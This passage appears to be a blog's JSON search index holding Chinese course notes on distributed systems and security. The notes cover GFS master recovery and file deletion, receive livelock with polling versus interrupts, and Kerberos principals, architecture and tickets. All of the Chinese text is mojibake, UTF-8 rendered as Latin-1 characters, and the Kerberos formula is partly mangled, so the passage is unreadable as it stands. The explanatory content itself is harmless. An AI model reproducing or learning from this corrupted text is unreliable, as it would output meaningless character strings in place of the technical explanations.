çš„æ˜ å°„ä¿¡æ¯ã€‚éšåï¼Œå®ƒè¯¢é—® Chunkserver å…¶æŒæœ‰çš„ Chunkï¼Œä»è€Œæ¢å¤ Chunk ID åˆ° Chunkserver çš„æ˜ å°„ä¿¡æ¯ã€‚è¿™ä¸€æ˜ å°„ä¿¡æ¯æ˜¯é€šè¿‡è¯¢é—® Chunkserver æ¢å¤çš„ï¼Œå› ä¸ºå®ƒæœ¬æ¥å°±æ²¡å¿…è¦å­˜åœ¨ Master ä¸Šã€‚ æ ¹æ®ç‰ˆæœ¬å·ä¸åŒï¼ŒChunkserver ä¸Šå¯èƒ½ä¼šå­˜åœ¨æ›´æ—§æˆ–æ›´æ–°çš„ Chunk å‰¯æœ¬ã€‚æ›´æ—§çš„å‰¯æœ¬ä¼šè¢«è®¤ä¸ºæ˜¯è¿‡æœŸçš„ï¼Œä¼šè¢«å¿½ç•¥ï¼Œä¸”ä¼šåœ¨åƒåœ¾å›æ”¶æ—¶è¢«ç§»é™¤ï¼›æ›´æ–°çš„å‰¯æœ¬åˆ™ä¼šä½¿å¾— Master ä¹Ÿé‡‡ç”¨è¯¥å‰¯æœ¬çš„ç‰ˆæœ¬å·ã€‚ è€Œå¦‚æœ Chunkserver å¤±æ•ˆï¼ŒMaster å› ä¸ºæ”¶ä¸åˆ°å¿ƒè·³ä¿¡æ¯ä¼šå‘ç°è¿™ä¸€ç‚¹å¹¶å‡å°‘å¯¹åº”çš„å‰¯æœ¬æ•°é‡ã€‚éšåï¼ŒMaster åœ¨åå°é‡æ–°å¤åˆ¶ç¼ºå°‘çš„è¿™äº›å‰¯æœ¬ï¼Œç¼ºå°‘çš„è¶Šå¤šä¼˜å…ˆçº§è¶Šé«˜ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:9:7","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"æ–‡ä»¶åˆ é™¤ å½“å®¢æˆ·ç«¯åˆ é™¤æ–‡ä»¶æ—¶ï¼ŒMaster è®°å½•åˆ é™¤æ—¥å¿—å¹¶å°†æ–‡ä»¶é‡å‘½åä¸ºâ€œæ–‡ä»¶å-åˆ é™¤æ—¶é—´æˆ³â€çš„å½¢å¼ï¼Œä»è€Œé¿å…å‘å¤šä¸ªå‰¯æœ¬å‘èµ·å¤šä¸ªåˆ é™¤è¯·æ±‚ï¼Œå½±å“æ€§èƒ½ã€‚åŒæ—¶ï¼ŒMaster åœ¨åå°æ‰«ææ–‡ä»¶ Namespaceï¼Œå½“æ‰«æåˆ°å·²ç»è¢«åˆ é™¤è¶…è¿‡ 3 å¤©çš„æ–‡ä»¶æ—¶æ‰ä¼šçœŸæ­£æ‰§è¡Œåˆ é™¤æ“ä½œï¼Œå¹¶åˆ é™¤å¯¹åº”çš„å…ƒæ•°æ®ã€‚åŒç†ï¼ŒMaster ä¹Ÿä¼šæ‰«æ Chunk çš„ Namespaceï¼Œå¹¶é€šçŸ¥ Chunkserver åˆ é™¤æœªè¢«å¼•ç”¨çš„ Chunkã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:9:8","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Receive Livelock å½±å“æ€§èƒ½çš„å› ç´ æœ‰å¾ˆå¤šã€‚ç¡¬ä»¶å¸¸å¸¸èƒ½å†³å®šæ€§èƒ½çš„ä¸Šé™ï¼Œè€Œä¸å½“çš„è½¯ä»¶å±‚é¢çš„è®¾è®¡å´æ— æ³•ä½¿ç¡¬ä»¶å……åˆ†å‘æŒ¥å…¶æ€§èƒ½ã€‚ç›¸åï¼Œè‰¯å¥½çš„è®¾è®¡åˆ™èƒ½ä½¿æ€§èƒ½å°½å¯èƒ½é€¼è¿‘è¿™ä¸€ä¸Šé™ã€‚ è¿™é‡Œè®¨è®ºçš„ Receive Livelockï¼Œå°±æ˜¯åœ¨ä¸­æ–­é©±åŠ¨çš„ç³»ç»Ÿä¸­ï¼Œå½“è¿‡é‡çš„è¯·æ±‚åˆ°è¾¾æ—¶ï¼Œç³»ç»Ÿå¿™äºé€šè¿‡ä¸­æ–­å¤„ç†è¯·æ±‚ï¼Œè€Œæ— æ³•æ‰§è¡ŒçœŸæ­£æœ‰ç”¨çš„å…¶ä»–æ“ä½œã€‚å’Œ Deadlock ç›¸åï¼Œç³»ç»Ÿå¹¶æ²¡æœ‰å¡æ­»åœ¨ä¸€ä¸ªçŠ¶æ€ä¸Šï¼Œä½†ä¸¤è€…çš„æ•ˆæœæ˜¯ç›¸åŒçš„ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:10:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"è½®è¯¢ä¸ä¸­æ–­ åœ¨ä»‹ç» Receive Livelock çš„ä¾‹å­å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€äº›èƒŒæ™¯çŸ¥è¯†ã€‚å½“ IO è®¾å¤‡å®Œæˆä¸€äº›å·¥ä½œæ—¶ã€æˆ–æ˜¯å‘ç”Ÿä¸€äº›äº‹ä»¶æ—¶ï¼Œéœ€è¦é€šçŸ¥ CPUï¼šæ¯”å¦‚æ”¶åˆ°ç½‘ç»œåŒ…ã€å®Œæˆç£ç›˜è¯»å–ã€æ”¶åˆ°é”®ç›˜è¾“å…¥ç­‰ç­‰ã€‚è¿™ç§â€œé€šçŸ¥â€é€šå¸¸æ˜¯é€šè¿‡ä¸¤ç§æ–¹å¼å®ç°ï¼š è½®è¯¢ï¼šCPU æ¯éš”ä¸€æ®µæ—¶é—´å°±è¯¢é—® IO è®¾å¤‡æ˜¯å¦æœ‰äº‹ä»¶å‘ç”Ÿï¼Œè¿™æ˜¯ä¸€ç§åŒæ­¥çš„æ–¹å¼ ä¸­æ–­ï¼šå‘ç”Ÿäº‹ä»¶æ—¶ï¼ŒIO è®¾å¤‡å‘ CPU å‘é€ä¿¡å·ï¼Œè¿™æ˜¯ä¸€ç§å¼‚æ­¥çš„æ–¹å¼ ä¹ä¸€çœ‹ï¼Œä¼¼ä¹æ˜¾ç„¶æ˜¯åè€…æ•ˆç‡æ›´é«˜ï¼Œç„¶è€Œå®é™…ä¸Šæœªå¿…å¦‚æ­¤ã€‚è¦åˆ¤æ–­éœ€è¦ä½¿ç”¨å“ªç§æ–¹å¼ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘ä¸¤ç‚¹ï¼šå¤„ç†äº‹ä»¶çš„å»¶è¿Ÿæ—¶é—´å’Œ CPU çš„è´Ÿè½½ã€‚ å¯¹äºè½®è¯¢æ¥è¯´ï¼Œè¦é™ä½å¤„ç†å»¶è¿Ÿï¼Œå°±éœ€è¦æé«˜è½®è¯¢é¢‘ç‡ï¼Œä½†è¿™ä¼šå¢åŠ  CPU è´Ÿè½½ã€‚å› æ­¤ï¼Œä½¿ç”¨è½®è¯¢çš„åœºæ™¯ï¼Œæ˜¯å¤„ç†é‚£äº›ç»å¸¸å‘ç”Ÿã€å¹¶å¯¹å¤„ç†å»¶è¿Ÿè¦æ±‚è¾ƒé«˜çš„äº‹ä»¶ã€‚æ³¨æ„è¿™é‡Œçš„â€œç»å¸¸â€é‡‡ç”¨çš„æ˜¯ CPU çš„æ—¶é—´å°ºåº¦ï¼Œä¹Ÿå°±æ˜¯å¾®ç§’è‡³æ¯«ç§’çº§çš„ã€‚ è€Œä¸­æ–­ç›¸åï¼Œé€‚åˆå¤„ç†å‘ç”Ÿä¸é¢‘ç¹ã€ä¸”å¤„ç†å»¶è¿Ÿè¦æ±‚ä¸é«˜çš„äº‹ä»¶ã€‚ä¸­æ–­å‘ç”Ÿæ—¶ï¼Œå¦‚æœä¸­æ–­ä¼˜å…ˆçº§ IPL é«˜äº CPU ä¼˜å…ˆçº§ï¼Œé‚£ä¹ˆ CPU ä¼šä¿å­˜å½“å‰è¿è¡Œç¨‹åºçš„ä¸Šä¸‹æ–‡ã€è·³è½¬åˆ°å†…æ ¸ä¸­çš„ä¸­æ–­å¤„ç†ç¨‹åº ISR å¯¹ä¸­æ–­è¿›è¡Œå¤„ç†ã€æœ€åæ¢å¤è¿è¡Œç¨‹åºçš„ä¸Šä¸‹æ–‡å¹¶ç»§ç»­ã€‚å¯ä»¥å‘ç°ï¼Œä¸­æ–­å¸¦æ¥çš„æ½œåœ¨é—®é¢˜å°±æ˜¯å¯¹å…¶ä»–ç³»ç»Ÿä»»åŠ¡çš„æŠ¢å ï¼Œä¹Ÿå°±æ˜¯å¼•èµ· Receive Livelock çš„æ ¹å› ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œç£ç›˜ IO å¿…å®šæ˜¯ç”± CPU è‡ªå·±å‘èµ·çš„ï¼Œå› æ­¤ç£ç›˜ IO å¯¼è‡´çš„ä¸­æ–­é¢‘ç‡å®é™…ä¸Šæ˜¯ CPU å¯æ§çš„ï¼Œç„¶è€Œç½‘ç»œ IO åˆ™æ²¡æœ‰è¿™ä¸€é™åˆ¶ã€‚è€Œä¸”ï¼Œè®¸å¤šåº”ç”¨ä½¿ç”¨çš„å¤šåª’ä½“ä¼ è¾“åè®®æˆ–æ˜¯ RPC åè®®å¾€å¾€åŸºäº UDP ç­‰æ²¡æœ‰æµé‡æ§åˆ¶çš„åè®®ä»¥æé«˜å®æ—¶æ€§ï¼Œè¿™ä½¿å¾—ç½‘ç»œè´Ÿè½½èƒ½å¤Ÿè¾¾åˆ°æé«˜çš„æ°´å¹³ï¼Œè¿›è€Œå¯¼è‡´ç³»ç»Ÿå°†å…¨éƒ¨æ—¶é—´èŠ±è´¹åœ¨é€šè¿‡ä¸­æ–­æ¥æ”¶ç½‘ç»œåŒ…ä¸Šï¼Œå¯¼è‡´ Receive Livelockã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:10:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ç½‘ç»œ IO æœºåˆ¶ æˆ‘ä»¬è®¾è®¡ç½‘ç»œ IO ç³»ç»Ÿæ—¶ï¼Œæƒ³è¦è¾¾åˆ°çš„ç›®æ ‡ä¸»è¦æœ‰ï¼š ä½å»¶è¿Ÿï¼Œå³å°½å¯èƒ½å¿«åœ°å¤„ç† IO äº‹ä»¶ ä½æŠ–åŠ¨ï¼Œå³å»¶è¿Ÿçš„å˜åŒ–å¹…åº¦è¾ƒå° å…¬å¹³æ€§ï¼Œå³ä¸åŒä»»åŠ¡éƒ½èƒ½å¾—åˆ°æ‰§è¡Œï¼Œä¸ä¼šå‡ºç°é¥¥é¥¿çš„æƒ…å†µ é«˜ååé‡ï¼Œå¦‚æ”¶å‘ç½‘ç»œåŒ…çš„ååé‡ è€Œä¸€ä¸ªç½‘ç»œ IO ç³»ç»Ÿéœ€è¦å®Œæˆçš„ä»»åŠ¡åˆ™å¯ä»¥åˆ†ä¸ºè¿™å‡ ç±»ï¼š æ¥æ”¶ç½‘ç»œåŒ… ä¼ è¾“ç½‘ç»œåŒ… å¤„ç†åè®®æ•°æ®ï¼ˆé€šå¸¸åœ¨å†…æ ¸ä¸­æ‰§è¡Œï¼‰ å¤„ç†å…¶ä»– IO äº‹ä»¶ åº”ç”¨å±‚é¢çš„äº‹ä»¶å¤„ç† ç”±äºä»»åŠ¡ç§ç±»å’Œé¢„æœŸç›®æ ‡éƒ½æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¼ ç»Ÿä¸­æ–­é©±åŠ¨ç³»ç»Ÿä¸­çš„ç½‘ç»œ IO æœºåˆ¶ã€‚ å½“ä¸€ä¸ªç½‘ç»œåŒ…åˆ°è¾¾ç½‘å¡æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªé«˜ IPL çš„ä¸­æ–­ã€‚å¯¹åº”çš„ ISR æŸ¥çœ‹ä»¥å¤ªç½‘åŒ…å¤´åå°±æ”¾å…¥ input queue å¹¶è¿”å›ã€‚è¿™æ˜¯å› ä¸ºé«˜ IPL çš„ä¸­æ–­ä¸èƒ½èŠ±è´¹å¤ªå¤šæ—¶é—´ï¼Œå¦åˆ™ä¼šå½±å“å…¶ä»–æ­£å¸¸ä»»åŠ¡çš„è¿è¡Œã€‚ä¹‹åï¼Œä¸€ä¸ªè¾ƒä½ IPL çš„è½¯ä»¶ä¸­æ–­ä¼šä» input queue ä¸­è¯»å–æ•°æ®åŒ…å¹¶å¤„ç† IP / TCP / UDP åŒ…å¤´ï¼Œå†å°†æ•°æ®åŒ…æ”¾å…¥ socket buffer ä¾›ç›®æ ‡åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚è€Œç›®æ ‡åº”ç”¨ç¨‹åºè¿è¡Œåœ¨ç”¨æˆ·æ€ï¼Œé€šè¿‡ read() ç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®åŒ…ï¼Œå› æ­¤æ‹¥æœ‰æ›´ä½çš„ IPLã€‚ å›¾ 3ï½œç½‘ç»œ IO æœºåˆ¶ \" å›¾ 3ï½œç½‘ç»œ IO æœºåˆ¶ è€Œå‘é€æ•°æ®åŒ…æ—¶ï¼Œå¤§è‡´å°±æ˜¯ç›¸åçš„æµç¨‹ï¼Œåªä¸è¿‡ input queue å˜æˆäº† output queueï¼Œè€Œ ä¼ è¾“åŒ…çš„ IPL æ˜¯ç•¥ä½äºæ¥æ”¶åŒ…çš„ IPL çš„ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§è®¾è®¡å°†æ¥æ”¶æ•°æ®åŒ…æ”¾åœ¨æœ€ä¼˜å…ˆçš„ä½ç½®ï¼Œè¿™æ˜¯å› ä¸ºæ—©æœŸç½‘å¡ç¼“å†²åŒºè¾ƒå°ï¼Œå¦‚æœä¸å°½å¿«æ¥æ”¶æ•°æ®åŒ…ï¼Œç¼“å†²åŒºæ»¡åå°±ä¼šä¸¢å¼ƒåç»­åˆ°è¾¾çš„æ•°æ®åŒ…ã€‚ å¦‚ä»Šå·²ç»ä¸å­˜åœ¨ç½‘å¡ç¼“å†²åŒºè¾ƒå°çš„é—®é¢˜äº†ï¼Œä½†è¿™ç§è®¾è®¡å¯¼è‡´è¯¸å¤šé—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œä¾‹å¦‚ï¼š å½“ç½‘ç»œåŒ…åˆ°è¾¾é€Ÿç‡è¶…è¿‡â€œæœ€å¤§æ— ä¸¢åŒ…æ¥æ”¶é€Ÿç‡â€æ—¶ï¼Œæœ¬åº”ä¿æŒä¸å˜çš„ç½‘ç»œåŒ…å‘é€é€Ÿç‡ä¼šé€æ­¥ä¸‹é™è‡³ 0 ç³»ç»Ÿæµªè´¹ CPU å»æ¥æ”¶å¤§é‡æ•°æ®åŒ…æ”¾å…¥é˜Ÿåˆ—ï¼Œè€Œé˜Ÿåˆ—ä¸­è®¸å¤šæ¥ä¸åŠè¢«å¤„ç†çš„åŒ…æœ€ç»ˆéƒ½ä¼šè¢«ä¸¢å¼ƒ å¤§é‡ç½‘ç»œåŒ…åœ¨æçŸ­æ—¶é—´å†…åˆ°è¾¾æ—¶ï¼Œåªæœ‰æ¥æ”¶å®Œå…¨éƒ¨åŒ…ä¹‹åæ‰èƒ½å°†ç¬¬ä¸€ä¸ªåŒ…å‘é€ç»™ç”¨æˆ·æ€çš„åº”ç”¨ç¨‹åº ç”±äºå‘é€çš„ IPL å°äºæ¥æ”¶ï¼Œå‘é€åŒ…çš„æ“ä½œä¼šé¥¥é¥¿ ","date":"2021-10-18","objectID":"/distributed-systems/:10:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"é¿å… Receive Livelock ä¸ºäº†é¿å… Receive Livelockï¼Œé¦–å…ˆå¾ˆå®¹æ˜“æƒ³åˆ°çš„åŠæ³•å°±æ˜¯é™æµï¼Œä¸æ˜¯é™åˆ¶æ•°æ®åŒ…åˆ°è¾¾çš„æµé‡ï¼Œè€Œæ˜¯é™åˆ¶ä¸­æ–­è§¦å‘çš„â€œæµé‡â€ã€‚åªè¦åœ¨æ¥æ”¶åŒ…çš„ ISR é‡Œï¼š è®¾ç½®æ ‡å¿—ä½ï¼Œè¡¨ç¤ºè¯¥ç½‘å¡æ”¶åˆ°äº†ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®åŒ… è°ƒåº¦å†…æ ¸çº¿ç¨‹ï¼Œç”¨è½®è¯¢ç½‘å¡çš„æ–¹å¼æ¥æ”¶æ•°æ®åŒ… ä¸é‡æ–°æ‰“å¼€æ¥æ”¶æ•°æ®åŒ…çš„ä¸­æ–­å¼€å…³ è¿™æ ·ä¸€æ¥ï¼Œåç»­æ¥æ”¶æ•°æ®åŒ…éƒ½ä¸ä¼šé‡‡ç”¨ä¸­æ–­çš„æ–¹å¼ï¼Œè€Œæ˜¯é€šè¿‡è½®è¯¢æ¥æ¥æ”¶åŒ…ï¼Œå› ä¸ºåœ¨é«˜é¢‘ IO çš„æƒ…å†µä¸‹è½®è¯¢çš„è¡¨ç°æ›´ä¼˜ã€‚ç±»ä¼¼åœ°ï¼Œæˆ‘ä»¬ä¸ä»…ä»…å¯ä»¥æ ¹æ®ç³»ç»Ÿä¸­çš„å„é¡¹æŒ‡æ ‡åŠ¨æ€æ§åˆ¶æ¥æ”¶æ•°æ®åŒ…çš„ä¸­æ–­å¼€å…³ï¼Œä¹Ÿå¯ä»¥åŠ¨æ€æ§åˆ¶å¤šä¸ªå…¶ä»–ä¸­æ–­çš„å¼€å…³æ¥è®©æ¸¡ CPU ç»™ç”¨æˆ·æ€ç¨‹åºï¼Œä¾‹å¦‚åœ¨ socket buffer æ¥è¿‘æ»¡æ—¶ã€‚ é‚£ä¹ˆå†…æ ¸çº¿ç¨‹æ˜¯æ€ä¹ˆè½®è¯¢ç½‘å¡çš„å‘¢ï¼Ÿå½“å†…æ ¸çº¿ç¨‹è¢«è°ƒåº¦æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥å“ªäº›ç½‘å¡ä¸Šè®¾ç½®äº†â€œæ”¶åˆ°æ•°æ®åŒ…â€çš„æ ‡å¿—ä½ï¼Œå¯¹è¿™äº›ç½‘å¡ä¸Šçš„æ•°æ®åŒ…ï¼Œå®ƒä¼šä¸€ç›´å¤„ç† IP / TCP / UDP åŒ…å¤´ç›´åˆ°å°†è¿™äº›åŒ…æ”¾å…¥ output queue æˆ–æ˜¯ socket bufferã€‚å¯¹äºæ¯æ¬¡è°ƒåº¦ï¼Œå†…æ ¸çº¿ç¨‹ä¸­è®¾ç½®äº†ä¸€ä¸ª quota æ¥é™åˆ¶å•æ¬¡è°ƒåº¦ä¸­åœ¨ä¸€ä¸ªç½‘å¡ä¸Šæœ€å¤šèƒ½å¤„ç†å¤šå°‘æ•°æ®åŒ…ï¼Œä»¥ä¿è¯å…¬å¹³æ€§ã€‚åŒæ—¶ï¼Œå†…æ ¸çº¿ç¨‹ä¸ä»…é‡‡ç”¨ round-robin çš„æ–¹å¼è½®è¯¢ç½‘å¡ï¼Œä¹Ÿç”¨åŒæ ·çš„æ–¹å¼è½®è¯¢æ¥æ”¶æ“ä½œä¸å‘é€æ“ä½œï¼Œé¿å…é¥¥é¥¿ç°è±¡ã€‚æœ€åï¼Œåªæœ‰ä¸€ä¸ªç½‘å¡ä¸Šæ²¡æœ‰å¾…å¤„ç†çš„åŒ…æ—¶ï¼Œè¯¥ç½‘å¡çš„æ¥æ”¶æ•°æ®åŒ…çš„ä¸­æ–­å¼€å…³æ‰ä¼šè¢«æ‰“å¼€ã€‚ é‡‡ç”¨è¿™ç§æ–¹å¼ï¼Œå½“è¿‡é‡æµé‡åˆ°è¾¾æ—¶ï¼Œå³ä½¿è¦ä¸¢å¼ƒæ•°æ®åŒ…ä¹Ÿä¸å†éœ€è¦ä¸­æ–­ã€ä¸å†éœ€è¦ CPU å‚ä¸äº†ï¼Œè€Œæ˜¯ç›´æ¥åœ¨ç½‘å¡å¤„å°±è¢«ä¸¢å¼ƒã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:10:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Kerberos åœ¨è®² Kerberos ä¹‹å‰å…ˆè®²äº†ä¸€äº›ä¿¡æ¯å®‰å…¨ç›¸å…³çš„åŸºç¡€çŸ¥è¯†ï¼Œæ²¡æœ‰ä»€ä¹ˆè®°å½•çš„å¿…è¦ã€‚Kerberos æ˜¯ MIT ç ”å‘çš„ä¸€ç§å¼€æ”¾ç¯å¢ƒä¸‹çš„è®¤è¯åè®®ï¼Œæœ€åˆè®¤è¯†è¿™ä¸ªåè®®è¿˜æ˜¯åœ¨ Windows çš„åŸŸé‡Œã€‚ è¿™é‡Œä»‹ç»çš„ Kerberos ç‰ˆæœ¬æ˜¯åŸå§‹è®ºæ–‡ä¸­çš„ç‰ˆæœ¬ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:11:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"åŸºç¡€æ¦‚å¿µ åœ¨ Kerberos ä¸­ï¼Œä¸€ä¸ªè¦ä½¿ç”¨æœåŠ¡çš„ç”¨æˆ·é€šè¿‡å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œç”±æœåŠ¡å™¨æä¾›æœåŠ¡å¹¶å®Œæˆå¯¹åº”çš„ä½œä¸šã€‚ä¸€ä¸ªè¦ä½¿ç”¨ Kerberos æœåŠ¡çš„å®ä½“è¢«ç§°ä¸º principalï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªç”¨æˆ·æˆ–è€…ä¸€ä¸ªæœåŠ¡å™¨ã€‚ æ¯ä¸ª principal éƒ½æœ‰è‡ªå·±çš„å¯¹ç§°å¯†é’¥ï¼Œåªæœ‰ principal è‡ªå·±å’Œ Kerberos ç³»ç»Ÿæœ¬èº«çŸ¥é“ã€‚å¦‚æœ principal æ˜¯ä¸€ä¸ªç”¨æˆ·ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯†é’¥ä¸€èˆ¬å°±æ˜¯è¯¥ç”¨æˆ·å¯†ç çš„å“ˆå¸Œã€‚ æœ€åï¼Œæ‰€è°“â€œå¼€æ”¾ç¯å¢ƒâ€ï¼Œå³ç½‘ç»œä¸­çš„æœºå™¨å¹¶ä¸æ˜¯ç”±æŸä¸ªç»„ç»‡æ§åˆ¶ï¼Œè€Œæ˜¯ç”¨æˆ·è‡ªå·±èƒ½å¤Ÿå®Œå…¨æ§åˆ¶çš„ï¼ˆç”¨æˆ·æ‹¥æœ‰æœºå™¨çš„ç®¡ç†å‘˜æƒé™ï¼‰ï¼Œå¹¶ä¸”ç”¨æˆ·è¿˜å¯èƒ½èƒ½å¤Ÿè®¿é—®å¤šå°æœºå™¨ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œä¸ä»…éœ€è¦è®¤è¯æœºå™¨ã€è¿˜éœ€è¦è®¤è¯ç”¨æˆ·æœ¬èº«ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:11:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"æ¶æ„ Kerberos åè®®ä¾èµ–äºä¸­å¿ƒåŒ–çš„ Kerberos æ•°æ®åº“ï¼Œé‡Œé¢å­˜æ”¾äº† principal å’Œå¯¹åº”çš„å¯†é’¥ã€‚Kerberos æ•°æ®åº“ä¸€èˆ¬ç”±ä¸€ä¸ª Master å’Œå¤šä¸ªåªè¯»çš„æ‹·è´ Slave æ„æˆã€‚æ¯éš”ä¸€æ®µæ—¶é—´ï¼ŒMaster æ•°æ®ä¼šæ›´æ–°åˆ° Slave ä¸Šã€‚ KDBM ç³»ç»Ÿå¯ä»¥è¯»å†™è¿™ä¸ªæ•°æ®åº“ï¼Œå¿…é¡»å’Œ Master è¿è¡Œåœ¨åŒä¸€æœºå™¨ä¸Šï¼›Kerberos ç³»ç»Ÿåªè´Ÿè´£è®¤è¯ï¼Œæ‰€ä»¥åªæœ‰æ•°æ®åº“è¯»æƒé™ï¼Œå¯ä»¥è¿è¡Œåœ¨ä»»æ„æ‹¥æœ‰ Slave çš„æœºå™¨ä¸Šã€‚ æ— è®ºæ˜¯æœåŠ¡æœ¬èº«è¿˜æ˜¯ä½¿ç”¨æœåŠ¡çš„ principalï¼Œéƒ½éœ€è¦åœ¨ Kerberos ç³»ç»Ÿä¸­æ³¨å†Œå¹¶åå•†ä¸€ä¸ªå¯†é’¥ã€‚Kerberos ç³»ç»Ÿè¿˜ä¼šç”Ÿæˆä¸´æ—¶çš„ session keyï¼Œç”¨äºåŠ å¯†æŸæ¬¡æœåŠ¡è¯·æ±‚è¿‡ç¨‹ä¸­çš„é€šè®¯ã€‚ Kerberos é‡‡ç”¨å½“æ—¶ä¾ç„¶å®‰å…¨çš„ DES-CBC åŠ å¯†ï¼Œå¦‚ä»Š DES å·²ç»ä¸å†å®‰å…¨äº†ã€‚å¥½åœ¨åŠ å¯†æ¨¡å—æ˜¯ç‹¬ç«‹çš„ï¼Œå¯ä»¥è½»æ¾è¢« AES ä¹‹ç±»çš„åŠ å¯†ç®—æ³•æ›¿æ¢ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:11:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ä¸»ä½“åç§° æ¯ä¸ªä¸»ä½“åœ¨è®¤è¯æ—¶éƒ½æœ‰è‡ªå·±çš„åç§°ï¼Œæ ¼å¼å½¢å¦‚ï¼š$p rimaryName.$instance@$realmï¼Œä¾‹å¦‚ rlogin.priam@ATHENA.MIT.EDUã€‚ primaryName æ˜¯ç”¨æˆ·æˆ–æœåŠ¡çš„åç§°ï¼Œinstance ä¸€èˆ¬è¡¨ç¤ºè¯¥ç”¨æˆ·åœ¨å“ªå°æœåŠ¡å™¨ä¸Šæ“ä½œã€æˆ–æ˜¯è¯¥æœåŠ¡åœ¨å“ªå°æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚realm åˆ™è¡¨ç¤ºç»´æŠ¤è®¤è¯ä¿¡æ¯çš„ç®¡ç†å®ä½“ï¼Œæ¯”å¦‚ä¸€ä¸ªç»„ç»‡ã€ä¸€ä¸ªéƒ¨é—¨ç­‰ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:11:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"åŸç† ç”¨æˆ·è¯·æ±‚æœåŠ¡çš„è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸¤æ­¥ï¼š è¯·æ±‚ä¸€ä¸ªç”¨äºè¯·æ±‚å…¶ä»–æœåŠ¡çš„ credential ç”¨è¿™ä¸ª credential è¯·æ±‚å¯¹åº”çš„æœåŠ¡ credential åˆåˆ†ä¸º ticket å’Œ authenticatorã€‚ticket ç”¨äºä¼ é€’å…³äºç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ï¼Œè€Œauthenticator ç”¨äºä¼ é€’å…³äºç”¨æˆ·æ‰€å¤„å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ã€‚ä¸€ä¸ª ticket é€šå¸¸é•¿è¿™æ ·ï¼š $$ \\{s,c,addr,timestamp,ttl,K_{s,c}\\}K_s $$ ç¬¦å· å«ä¹‰ s æœåŠ¡å™¨ï¼ˆçš„åç§°ï¼‰ c å®¢æˆ·ç«¯ï¼ˆçš„åç§°ï¼‰ addr å®¢æˆ·ç«¯ IP åœ°å€ 